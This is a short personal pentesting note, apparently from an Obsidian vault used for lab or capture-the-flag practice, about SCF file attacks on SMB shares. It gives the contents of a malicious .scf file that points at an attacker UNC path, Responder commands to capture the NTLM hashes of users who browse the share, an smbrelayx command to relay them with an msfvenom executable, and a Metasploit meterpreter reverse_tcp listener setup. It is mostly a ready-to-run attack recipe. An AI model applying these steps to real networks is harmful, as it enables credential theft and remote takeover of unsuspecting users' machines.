---
creation date: December 19th 2022
last modified date: December 19th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[scf files]]  
___

## Description:  
Uploading .scf files to steal password hashes
https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/

Start responder:
`sudo responder -wrf --lm -v -I tun0`

upload the following .scf file to a file share (make sure to use a .scf extension):
```
[Shell]
Command=2
IconFile=\\10.10.14.79\share\test.ico
[Taskbar]
Command=ToggleDesktop

```

Once someone clicks on the file, their machine will try to authenticate back to you.

**Use smbrelayx to get a reverse shell

Use msfvenom to make a reverse shell, then start smbrelay:

`sudo python3 /usr/share/doc/python3-impacket/examples/smbrelayx.py -h 10.129.217.3 -e ./pentestlab.exe`

Start your listener:
```
sudo msfconsole 

set payload windows/meterpreter/reverse_tcp

set LHOST 192.168.1.171

set LPORT 5555

Exploit
```

Then upload your .scf file and wait for someone to click on it

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 19th 2022 (02:48 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
